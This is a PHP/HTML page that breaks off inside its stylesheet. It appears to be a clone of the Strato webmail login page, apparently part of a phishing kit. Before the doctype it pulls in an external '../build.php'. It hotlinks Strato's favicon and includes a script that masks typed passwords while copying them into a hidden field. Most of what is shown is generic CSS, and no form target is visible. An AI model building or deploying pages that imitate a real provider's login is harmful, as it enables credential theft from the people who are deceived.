<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html lang="en"
    class="no-applicationcache audio canvas canvastext emoji indexeddb indexeddb-deletedatabase json no-unicode video cssanimations supports csstransforms3d filereader localstorage websqldatabase websockets pointerevents windows">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="msapplication-tap-highlight" content="no" />
    <meta name="google" value="notranslate" />
    <meta name="robots" content="nofollow" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-title" content="" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
    <link id="favicon-ico" rel="icon" href="https://webmail.strato.de/favicon.ico" sizes="any">

    <style type="text/css">
        /*! normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css */
        html {
            font-family: sans-serif;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }

        body {
            margin: 0
        }

        article,
        aside,
        details,
        figcaption,
        figure,
        footer,
        header,
        hgroup,
        main,
        menu,
        nav,
        section,
        summary {
            display: block
        }

        audio,
        canvas,
        progress,
        video {
            display: inline-block;
            vertical-align: baseline
        }

        audio:not([controls]) {
            display: none;
            height: 0
        }

        [hidden],
        template {
            display: none
        }

        a {
            background-color: transparent
        }

        a:active,
        a:hover {
            outline: 0
        }

        abbr[title] {
            border-bottom: 0;
            text-decoration: underline;
            text-decoration: underline dotted
        }

        b,
        strong {
            font-weight: 700
        }

        dfn {
            font-style: italic
        }

        h1 {
            font-size: 2em;
            margin: .67em 0
        }

        mark {
            background: #ff0;
            color: #000
        }

        small {
            font-size: 80%
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline
        }

        sup {
            top: -.5em
        }

        sub {
            bottom: -.25em
        }

        img {
            border: 0
        }

        svg:not(:root) {
            overflow: hidden
        }

        figure {
            margin: 1em 40px
        }

        hr {
            box-sizing: content-box;
            height: 0
        }

        pre {
            overflow: auto
        }

        code,
        kbd,
        pre,
        samp {
            font-family: monospace, monospace;
            font-size: 1em
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            color: inherit;
            font: inherit;
            margin: 0
        }

        button {
            overflow: visible
        }

        button,
        select {
            text-transform: none
        }

        button,
        html input[type=button],
        input[type=reset],
        input[type=submit] {
            -webkit-appearance: button;
            cursor: pointer
        }

        button[disabled],
        html input[disabled] {
            cursor: default
        }

        button::-moz-focus-inner,
        input::-moz-focus-inner {
            border: 0;
            padding: 0
        }

        input {
            line-height: normal
        }

        input[type=checkbox],
        input[type=radio] {
            box-sizing: border-box;
            padding: 0
        }

        input[type=number]::-webkit-inner-spin-button,
        input[type=number]::-webkit-outer-spin-button {
            height: auto
        }

        input[type=search] {
            -webkit-appearance: textfield;
            box-sizing: content-box
        }

        input[type=search]::-webkit-search-cancel-button,
        input[type=search]::-webkit-search-decoration {
            -webkit-appearance: none
        }

        fieldset {
            border: 1px solid silver;
            margin: 0 2px;
            padding: .35em .625em .75em
        }

        legend {
            border: 0;
            padding: 0
        }

        textarea {
            overflow: auto
        }

        optgroup {
            font-weight: 700
        }

        table {
            border-collapse: collapse;
            border-spacing: 0
        }

        td,
        th {
            padding: 0
        }

        * {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        :before,
        :after {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        html {
            font-size: 10px;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-size: 14px;
            line-height: 1.42857143;
            color: #333;
            background-color: #fff
        }

        input,
        button,
        select,
        textarea {
            font-family: inherit;
            font-size: inherit;
            line-height: inherit
        }

        a {
            color: #3c61aa;
            text-decoration: none
        }

        a:hover,
        a:focus {
            color: #284171;
            text-decoration: underline
        }

        a:focus {
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px
        }

        figure {
            margin: 0
        }

        img {
            vertical-align: middle
        }

        .img-responsive {
            display: block;
            max-width: 100%;
            height: auto
        }

        .img-rounded {
            border-radius: 3px
        }

        .img-thumbnail {
            padding: 4px;
            line-height: 1.42857143;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 3px;
            -webkit-transition: all .2s ease-in-out;
            -o-transition: all .2s ease-in-out;
            transition: all .2s ease-in-out;
            display: inline-block;
            max-width: 100%;
            height: auto
        }

        .img-circle {
            border-radius: 50%
        }

        hr {
            margin-top: 20px;
            margin-bottom: 20px;
            border: 0;
            border-top: 1px solid #eee
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0
        }

        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            position: static;
            width: auto;
            height: auto;
            margin: 0;
            overflow: visible;
            clip: auto
        }

        [role=button] {
            cursor: pointer
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        .h1,
        .h2,
        .h3,
        .h4,
        .h5,
        .h6 {
            font-family: inherit;
            font-weight: 500;
            line-height: 1.1;
            color: inherit
        }

        h1 small,
        h2 small,
        h3 small,
        h4 small,
        h5 small,
        h6 small,
        .h1 small,
        .h2 small,
        .h3 small,
        .h4 small,
        .h5 small,
        .h6 small,
        h1 .small,
        h2 .small,
        h3 .small,
        h4 .small,
        h5 .small,
        h6 .small,
        .h1 .small,
        .h2 .small,
        .h3 .small,
        .h4 .small,
        .h5 .small,
        .h6 .small {
            font-weight: 400;
            line-height: 1;
            color: #777
        }

        h1,
        .h1,
        h2,
        .h2,
        h3,
        .h3 {
            margin-top: 20px;
            margin-bottom: 10px
        }

        h1 small,
        .h1 small,
        h2 small,
        .h2 small,
        h3 small,
        .h3 small,
        h1 .small,
        .h1 .small,
        h2 .small,
        .h2 .small,
        h3 .small,
        .h3 .small {
            font-size: 65%
        }

        h4,
        .h4,
        h5,
        .h5,
        h6,
        .h6 {
            margin-top: 10px;
            margin-bottom: 10px
        }

        h4 small,
        .h4 small,
        h5 small,
        .h5 small,
        h6 small,
        .h6 small,
        h4 .small,
        .h4 .small,
        h5 .small,
        .h5 .small,
        h6 .small,
        .h6 .small {
            font-size: 75%
        }

        h1,
        .h1 {
            font-size: 36px
        }

        h2,
        .h2 {
            font-size: 30px
        }

        h3,
        .h3 {
            font-size: 24px
        }

        h4,
        .h4 {
            font-size: 18px
        }

        h5,
        .h5 {
            font-size: 14px
        }

        h6,
        .h6 {
            font-size: 12px
        }

        p {
            margin: 0 0 10px
        }

        .lead {
            margin-bottom: 20px;
            font-size: 16px;
            font-weight: 300;
            line-height: 1.4
        }

        @media (min-width:768px) {
            .lead {
                font-size: 21px
            }
        }

        small,
        .small {
            font-size: 85%
        }

        mark,
        .mark {
            padding: .2em;
            background-color: #fcf8e3
        }

        .text-left {
            text-align: left
        }

        .text-right {
            text-align: right
        }

        .text-center {
            text-align: center
        }

        .text-justify {
            text-align: justify
        }

        .text-nowrap {
            white-space: nowrap
        }

        .text-lowercase {
            text-transform: lowercase
        }

        .text-uppercase {
            text-transform: uppercase
        }

        .text-capitalize {
            text-transform: capitalize
        }

        .text-muted {
            color: #777
        }

        .text-primary {
            color: #283f73
        }

        a.text-primary:hover,
        a.text-primary:focus {
            color: #1b2a4d
        }

        .text-success {
            color: #3c763d
        }

        a.text-success:hover,
        a.text-success:focus {
            color: #2b542c
        }

        .text-info {
            color: #31708f
        }

        a.text-info:hover,
        a.text-info:focus {
            color: #245269
        }

        .text-warning {
            color: #8a6d3b
        }

        a.text-warning:hover,
        a.text-warning:focus {
            color: #66512c
        }

        .text-danger {
            color: #a94442
        }

        a.text-danger:hover,
        a.text-danger:focus {
            color: #843534
        }

        .bg-primary {
            color: #fff;
            background-color: #283f73
        }

        a.bg-primary:hover,
        a.bg-primary:focus {
            background-color: #1b2a4d
        }

        .bg-success {
            background-color: #dff0d8
        }

        a.bg-success:hover,
        a.bg-success:focus {
            background-color: #c1e2b3
        }

        .bg-info {
            background-color: #d9edf7
        }

        a.bg-info:hover,
        a.bg-info:focus {
            background-color: #afd9ee
        }

        .bg-warning {
            background-color: #fcf8e3
        }

        a.bg-warning:hover,
        a.bg-warning:focus {
            background-color: #f7ecb5
        }

        .bg-danger {
            background-color: #f2dede
        }

        a.bg-danger:hover,
        a.bg-danger:focus {
            background-color: #e4b9b9
        }

        .page-header {
            padding-bottom: 9px;
            margin: 40px 0 20px;
            border-bottom: 1px solid #eee
        }

        ul,
        ol {
            margin-top: 0;
            margin-bottom: 10px
        }

        ul ul,
        ol ul,
        ul ol,
        ol ol {
            margin-bottom: 0
        }

        .list-unstyled {
            padding-left: 0;
            list-style: none
        }

        .list-inline {
            padding-left: 0;
            list-style: none;
            margin-left: -5px
        }

        .list-inline>li {
            display: inline-block;
            padding-right: 5px;
            padding-left: 5px
        }

        dl {
            margin-top: 0;
            margin-bottom: 20px
        }

        dt,
        dd {
            line-height: 1.42857143
        }

        dt {
            font-weight: 700
        }

        dd {
            margin-left: 0
        }

        @media (min-width:768px) {
            .dl-horizontal dt {
                float: left;
                width: 160px;
                clear: left;
                text-align: right;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap
            }

            .dl-horizontal dd {
                margin-left: 180px
            }
        }

        abbr[title],
        abbr[data-original-title] {
            cursor: help
        }

        .initialism {
            font-size: 90%;
            text-transform: uppercase
        }

        blockquote {
            padding: 10px 20px;
            margin: 0 0 20px;
            font-size: 17.5px;
            border-left: 5px solid #eee
        }

        blockquote p:last-child,
        blockquote ul:last-child,
        blockquote ol:last-child {
            margin-bottom: 0
        }

        blockquote footer,
        blockquote small,
        blockquote .small {
            display: block;
            font-size: 80%;
            line-height: 1.42857143;
            color: #777
        }

        blockquote footer:before,
        blockquote small:before,
        blockquote .small:before {
            content: "\2014 \00A0"
        }

        .blockquote-reverse,
        blockquote.pull-right {
            padding-right: 15px;
            padding-left: 0;
            text-align: right;
            border-right: 5px solid #eee;
            border-left: 0
        }

        .blockquote-reverse footer:before,
        blockquote.pull-right footer:before,
        .blockquote-reverse small:before,
        blockquote.pull-right small:before,
        .blockquote-reverse .small:before,
        blockquote.pull-right .small:before {
            content: ""
        }

        .blockquote-reverse footer:after,
        blockquote.pull-right footer:after,
        .blockquote-reverse small:after,
        blockquote.pull-right small:after,
        .blockquote-reverse .small:after,
        blockquote.pull-right .small:after {
            content: "\00A0 \2014"
        }

        address {
            margin-bottom: 20px;
            font-style: normal;
            line-height: 1.42857143
        }

        .container {
            padding-right: 15px;
            padding-left: 15px;
            margin-right: auto;
            margin-left: auto
        }

        @media (min-width:768px) {
            .container {
                width: 750px
            }
        }

        @media (min-width:992px) {
            .container {
                width: 900px
            }
        }

        @media (min-width:1200px) {
            .container {
                width: 900px
            }
        }

        .container-fluid {
            padding-right: 15px;
            padding-left: 15px;
            margin-right: auto;
            margin-left: auto
        }

        .row {
            margin-right: -15px;
            margin-left: -15px
        }

        .row-no-gutters {
            margin-right: 0;
            margin-left: 0
        }

        .row-no-gutters [class*=col-] {
            padding-right: 0;
            padding-left: 0
        }

        .col-xs-1,
        .col-sm-1,
        .col-md-1,
        .col-lg-1,
        .col-xs-2,
        .col-sm-2,
        .col-md-2,
        .col-lg-2,
        .col-xs-3,
        .col-sm-3,
        .col-md-3,
        .col-lg-3,
        .col-xs-4,
        .col-sm-4,
        .col-md-4,
        .col-lg-4,
        .col-xs-5,
        .col-sm-5,
        .col-md-5,
        .col-lg-5,
        .col-xs-6,
        .col-sm-6,
        .col-md-6,
        .col-lg-6,
        .col-xs-7,
        .col-sm-7,
        .col-md-7,
        .col-lg-7,
        .col-xs-8,
        .col-sm-8,
        .col-md-8,
        .col-lg-8,
        .col-xs-9,
        .col-sm-9,
        .col-md-9,
        .col-lg-9,
        .col-xs-10,
        .col-sm-10,
        .col-md-10,
        .col-lg-10,
        .col-xs-11,
        .col-sm-11,
        .col-md-11,
        .col-lg-11,
        .col-xs-12,
        .col-sm-12,
        .col-md-12,
        .col-lg-12 {
            position: relative;
            min-height: 1px;
            padding-right: 15px;
            padding-left: 15px
        }

        .col-xs-1,
        .col-xs-2,
        .col-xs-3,
        .col-xs-4,
        .col-xs-5,
        .col-xs-6,
        .col-xs-7,
        .col-xs-8,
        .col-xs-9,
        .col-xs-10,
        .col-xs-11,
        .col-xs-12 {
            float: left
        }

        .col-xs-12 {
            width: 100%
        }

        .col-xs-11 {
            width: 91.66666667%
        }

        .col-xs-10 {
            width: 83.33333333%
        }

        .col-xs-9 {
            width: 75%
        }

        .col-xs-8 {
            width: 66.66666667%
        }

        .col-xs-7 {
            width: 58.33333333%
        }

        .col-xs-6 {
            width: 50%
        }

        .col-xs-5 {
            width: 41.66666667%
        }

        .col-xs-4 {
            width: 33.33333333%
        }

        .col-xs-3 {
            width: 25%
        }

        .col-xs-2 {
            width: 16.66666667%
        }

        .col-xs-1 {
            width: 8.33333333%
        }

        .col-xs-pull-12 {
            right: 100%
        }

        .col-xs-pull-11 {
            right: 91.66666667%
        }

        .col-xs-pull-10 {
            right: 83.33333333%
        }

        .col-xs-pull-9 {
            right: 75%
        }

        .col-xs-pull-8 {
            right: 66.66666667%
        }

        .col-xs-pull-7 {
            right: 58.33333333%
        }

        .col-xs-pull-6 {
            right: 50%
        }

        .col-xs-pull-5 {
            right: 41.66666667%
        }

        .col-xs-pull-4 {
            right: 33.33333333%
        }

        .col-xs-pull-3 {
            right: 25%
        }

        .col-xs-pull-2 {
            right: 16.66666667%
        }

        .col-xs-pull-1 {
            right: 8.33333333%
        }

        .col-xs-pull-0 {
            right: auto
        }

        .col-xs-push-12 {
            left: 100%
        }

        .col-xs-push-11 {
            left: 91.66666667%
        }

        .col-xs-push-10 {
            left: 83.33333333%
        }

        .col-xs-push-9 {
            left: 75%
        }

        .col-xs-push-8 {
            left: 66.66666667%
        }

        .col-xs-push-7 {
            left: 58.33333333%
        }

        .col-xs-push-6 {
            left: 50%
        }

        .col-xs-push-5 {
            left: 41.66666667%
        }

        .col-xs-push-4 {
            left: 33.33333333%
        }

        .col-xs-push-3 {
            left: 25%
        }

        .col-xs-push-2 {
            left: 16.66666667%
        }

        .col-xs-push-1 {
            left: 8.33333333%
        }

        .col-xs-push-0 {
            left: auto
        }

        .col-xs-offset-12 {
            margin-left: 100%
        }

        .col-xs-offset-11 {
            margin-left: 91.66666667%
        }

        .col-xs-offset-10 {
            margin-left: 83.33333333%
        }

        .col-xs-offset-9 {
            margin-left: 75%
        }

        .col-xs-offset-8 {
            margin-left: 66.66666667%
        }

        .col-xs-offset-7 {
            margin-left: 58.33333333%
        }

        .col-xs-offset-6 {
            margin-left: 50%
        }

        .col-xs-offset-5 {
            margin-left: 41.66666667%
        }

        .col-xs-offset-4 {
            margin-left: 33.33333333%
        }

        .col-xs-offset-3 {
            margin-left: 25%
        }

        .col-xs-offset-2 {
            margin-left: 16.66666667%
        }

        .col-xs-offset-1 {
            margin-left: 8.33333333%
        }

        .col-xs-offset-0 {
            margin-left: 0
        }

        @media (min-width:768px) {

            .col-sm-1,
            .col-sm-2,
            .col-sm-3,
            .col-sm-4,
            .col-sm-5,
            .col-sm-6,
            .col-sm-7,
            .col-sm-8,
            .col-sm-9,
            .col-sm-10,
            .col-sm-11,
            .col-sm-12 {
                float: left
            }

            .col-sm-12 {
                width: 100%
            }

            .col-sm-11 {
                width: 91.66666667%
            }

            .col-sm-10 {
                width: 83.33333333%
            }

            .col-sm-9 {
                width: 75%
            }

            .col-sm-8 {
                width: 66.66666667%
            }

            .col-sm-7 {
                width: 58.33333333%
            }

            .col-sm-6 {
                width: 50%
            }

            .col-sm-5 {
                width: 41.66666667%
            }

            .col-sm-4 {
                width: 33.33333333%
            }

            .col-sm-3 {
                width: 25%
            }

            .col-sm-2 {
                width: 16.66666667%
            }

            .col-sm-1 {
                width: 8.33333333%
            }

            .col-sm-pull-12 {
                right: 100%
            }

            .col-sm-pull-11 {
                right: 91.66666667%
            }

            .col-sm-pull-10 {
                right: 83.33333333%
            }

            .col-sm-pull-9 {
                right: 75%
            }

            .col-sm-pull-8 {
                right: 66.66666667%
            }

            .col-sm-pull-7 {
                right: 58.33333333%
            }

            .col-sm-pull-6 {
                right: 50%
            }

            .col-sm-pull-5 {
                right: 41.66666667%
            }

            .col-sm-pull-4 {
                right: 33.33333333%
            }

            .col-sm-pull-3 {
                right: 25%
            }

            .col-sm-pull-2 {
                right: 16.66666667%
            }

            .col-sm-pull-1 {
                right: 8.33333333%
            }

            .col-sm-pull-0 {
                right: auto
            }

            .col-sm-push-12 {
                left: 100%
            }

            .col-sm-push-11 {
                left: 91.66666667%
            }

            .col-sm-push-10 {
                left: 83.33333333%
            }

            .col-sm-push-9 {
                left: 75%
            }

            .col-sm-push-8 {
                left: 66.66666667%
            }

            .col-sm-push-7 {
                left: 58.33333333%
            }

            .col-sm-push-6 {
                left: 50%
            }

            .col-sm-push-5 {
                left: 41.66666667%
            }

            .col-sm-push-4 {
                left: 33.33333333%
            }

            .col-sm-push-3 {
                left: 25%
            }

            .col-sm-push-2 {
                left: 16.66666667%
            }

            .col-sm-push-1 {
                left: 8.33333333%
            }

            .col-sm-push-0 {
                left: auto
            }

            .col-sm-offset-12 {
                margin-left: 100%
            }

            .col-sm-offset-11 {
                margin-left: 91.66666667%
            }

            .col-sm-offset-10 {
                margin-left: 83.33333333%
            }

            .col-sm-offset-9 {
                margin-left: 75%
            }

            .col-sm-offset-8 {
                margin-left: 66.66666667%
            }

            .col-sm-offset-7 {
                margin-left: 58.33333333%
            }

            .col-sm-offset-6 {
                margin-left: 50%
            }

            .col-sm-offset-5 {
                margin-left: 41.66666667%
            }

            .col-sm-offset-4 {
                margin-left: 33.33333333%
            }

            .col-sm-offset-3 {
                margin-left: 25%
            }

            .col-sm-offset-2 {
                margin-left: 16.66666667%
            }

            .col-sm-offset-1 {
                margin-left: 8.33333333%
            }

            .col-sm-offset-0 {
                margin-left: 0
            }
        }

        @media (min-width:992px) {

            .col-md-1,
            .col-md-2,
            .col-md-3,
            .col-md-4,
            .col-md-5,
            .col-md-6,
            .col-md-7,
            .col-md-8,
            .col-md-9,
            .col-md-10,
            .col-md-11,
            .col-md-12 {
                float: left
            }

            .col-md-12 {
                width: 100%
            }

            .col-md-11 {
                width: 91.66666667%
            }

            .col-md-10 {
                width: 83.33333333%
            }

            .col-md-9 {
                width: 75%
            }

            .col-md-8 {
                width: 66.66666667%
            }

            .col-md-7 {
                width: 58.33333333%
            }

            .col-md-6 {
                width: 50%
            }

            .col-md-5 {
                width: 41.66666667%
            }

            .col-md-4 {
                width: 33.33333333%
            }

            .col-md-3 {
                width: 25%
            }

            .col-md-2 {
                width: 16.66666667%
            }

            .col-md-1 {
                width: 8.33333333%
            }

            .col-md-pull-12 {
                right: 100%
            }

            .col-md-pull-11 {
                right: 91.66666667%
            }

            .col-md-pull-10 {
                right: 83.33333333%
            }

            .col-md-pull-9 {
                right: 75%
            }

            .col-md-pull-8 {
                right: 66.66666667%
            }

            .col-md-pull-7 {
                right: 58.33333333%
            }

            .col-md-pull-6 {
                right: 50%
            }

            .col-md-pull-5 {
                right: 41.66666667%
            }

            .col-md-pull-4 {
                right: 33.33333333%
            }

            .col-md-pull-3 {
                right: 25%
            }

            .col-md-pull-2 {
                right: 16.66666667%
            }

            .col-md-pull-1 {
                right: 8.33333333%
            }

            .col-md-pull-0 {
                right: auto
            }

            .col-md-push-12 {
                left: 100%
            }

            .col-md-push-11 {
                left: 91.66666667%
            }

            .col-md-push-10 {
                left: 83.33333333%
            }

            .col-md-push-9 {
                left: 75%
            }

            .col-md-push-8 {
                left: 66.66666667%
            }

            .col-md-push-7 {
                left: 58.33333333%
            }

            .col-md-push-6 {
                left: 50%
            }

            .col-md-push-5 {
                left: 41.66666667%
            }

            .col-md-push-4 {
                left: 33.33333333%
            }

            .col-md-push-3 {
                left: 25%
            }

            .col-md-push-2 {
                left: 16.66666667%
            }

            .col-md-push-1 {
                left: 8.33333333%
            }

            .col-md-push-0 {
                left: auto
            }

            .col-md-offset-12 {
                margin-left: 100%
            }

            .col-md-offset-11 {
                margin-left: 91.66666667%
            }

            .col-md-offset-10 {
                margin-left: 83.33333333%
            }

            .col-md-offset-9 {
                margin-left: 75%
            }

            .col-md-offset-8 {
                margin-left: 66.66666667%
            }

            .col-md-offset-7 {
                margin-left: 58.33333333%
            }

            .col-md-offset-6 {
                margin-left: 50%
            }

            .col-md-offset-5 {
                margin-left: 41.66666667%
            }

            .col-md-offset-4 {
                margin-left: 33.33333333%
            }

            .col-md-offset-3 {
                margin-left: 25%
            }

            .col-md-offset-2 {
                margin-left: 16.66666667%
            }

            .col-md-offset-1 {
                margin-left: 8.33333333%
            }

            .col-md-offset-0 {
                margin-left: 0
            }
        }

        @media (min-width:1200px) {

            .col-lg-1,
            .col-lg-2,
            .col-lg-3,
            .col-lg-4,
            .col-lg-5,
            .col-lg-6,
            .col-lg-7,
            .col-lg-8,
            .col-lg-9,
            .col-lg-10,
            .col-lg-11,
            .col-lg-12 {
                float: left
            }

            .col-lg-12 {
                width: 100%
            }

            .col-lg-11 {
                width: 91.66666667%
            }

            .col-lg-10 {
                width: 83.33333333%
            }

            .col-lg-9 {
                width: 75%
            }

            .col-lg-8 {
                width: 66.66666667%
            }

            .col-lg-7 {
                width: 58.33333333%
            }

            .col-lg-6 {
                width: 50%
            }

            .col-lg-5 {
                width: 41.66666667%
            }

            .col-lg-4 {
                width: 33.33333333%
            }

            .col-lg-3 {
                width: 25%
            }

            .col-lg-2 {
                width: 16.66666667%
            }

            .col-lg-1 {
                width: 8.33333333%
            }

            .col-lg-pull-12 {
                right: 100%
            }

            .col-lg-pull-11 {
                right: 91.66666667%
            }

            .col-lg-pull-10 {
                right: 83.33333333%
            }

            .col-lg-pull-9 {
                right: 75%
            }

            .col-lg-pull-8 {
                right: 66.66666667%
            }

            .col-lg-pull-7 {
                right: 58.33333333%
            }

            .col-lg-pull-6 {
                right: 50%
            }

            .col-lg-pull-5 {
                right: 41.66666667%
            }

            .col-lg-pull-4 {
                right: 33.33333333%
            }

            .col-lg-pull-3 {
                right: 25%
            }

            .col-lg-pull-2 {
                right: 16.66666667%
            }

            .col-lg-pull-1 {
                right: 8.33333333%
            }

            .col-lg-pull-0 {
                right: auto
            }

            .col-lg-push-12 {
                left: 100%
            }

            .col-lg-push-11 {
                left: 91.66666667%
            }

            .col-lg-push-10 {
                left: 83.33333333%
            }

            .col-lg-push-9 {
                left: 75%
            }

            .col-lg-push-8 {
                left: 66.66666667%
            }

            .col-lg-push-7 {
                left: 58.33333333%
            }

            .col-lg-push-6 {
                left: 50%
            }

            .col-lg-push-5 {
                left: 41.66666667%
            }

            .col-lg-push-4 {
                left: 33.33333333%
            }

            .col-lg-push-3 {
                left: 25%
            }

            .col-lg-push-2 {
                left: 16.66666667%
            }

            .col-lg-push-1 {
                left: 8.33333333%
            }

            .col-lg-push-0 {
                left: auto
            }

            .col-lg-offset-12 {
                margin-left: 100%
            }

            .col-lg-offset-11 {
                margin-left: 91.66666667%
            }

            .col-lg-offset-10 {
                margin-left: 83.33333333%
            }

            .col-lg-offset-9 {
                margin-left: 75%
            }

            .col-lg-offset-8 {
                margin-left: 66.66666667%
            }

            .col-lg-offset-7 {
                margin-left: 58.33333333%
            }

            .col-lg-offset-6 {
                margin-left: 50%
            }

            .col-lg-offset-5 {
                margin-left: 41.66666667%
            }

            .col-lg-offset-4 {
                margin-left: 33.33333333%
            }

            .col-lg-offset-3 {
                margin-left: 25%
            }

            .col-lg-offset-2 {
                margin-left: 16.66666667%
            }

            .col-lg-offset-1 {
                margin-left: 8.33333333%
            }

            .col-lg-offset-0 {
                margin-left: 0
            }
        }

        fieldset {
            min-width: 0;
            padding: 0;
            margin: 0;
            border: 0
        }

        legend {
            display: block;
            width: 100%;
            padding: 0;
            margin-bottom: 20px;
            font-size: 21px;
            line-height: inherit;
            color: #333;
            border: 0;
            border-bottom: 1px solid #e5e5e5
        }

        label {
            display: inline-block;
            max-width: 100%;
            margin-bottom: 5px;
            font-weight: 700
        }

        input[type=search] {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-appearance: none;
            appearance: none
        }

        input[type=radio],
        input[type=checkbox] {
            margin: 4px 0 0;
            margin-top: 1px \9;
            line-height: normal
        }

        input[type=radio][disabled],
        input[type=checkbox][disabled],
        input[type=radio].disabled,
        input[type=checkbox].disabled,
        fieldset[disabled] input[type=radio],
        fieldset[disabled] input[type=checkbox] {
            cursor: not-allowed
        }

        input[type=file] {
            display: block
        }

        input[type=range] {
            display: block;
            width: 100%
        }

        select[multiple],
        select[size] {
            height: auto
        }

        input[type=file]:focus,
        input[type=radio]:focus,
        input[type=checkbox]:focus {
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px
        }

        output {
            display: block;
            padding-top: 5px;
            font-size: 14px;
            line-height: 1.42857143;
            color: #555
        }

        .form-control {
            display: block;
            width: 100%;
            height: 30px;
            padding: 4px 12px;
            font-size: 14px;
            line-height: 1.42857143;
            color: #555;
            background-color: #fff;
            background-image: none;
            border: 1px solid #ccc;
            border-radius: 3px;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
            -webkit-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
            -o-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
            transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s
        }

        .form-control:focus {
            border-color: #66afe9;
            outline: 0;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 8px rgba(102, 175, 233, .6);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 8px rgba(102, 175, 233, .6)
        }

        .form-control::-moz-placeholder {
            color: #999;
            opacity: 1
        }

        .form-control:-ms-input-placeholder {
            color: #999
        }

        .form-control::-webkit-input-placeholder {
            color: #999
        }

        .form-control::-ms-expand {
            background-color: transparent;
            border: 0
        }

        .form-control[disabled],
        .form-control[readonly],
        fieldset[disabled] .form-control {
            background-color: #eee;
            opacity: 1
        }

        .form-control[disabled],
        fieldset[disabled] .form-control {
            cursor: not-allowed
        }

        textarea.form-control {
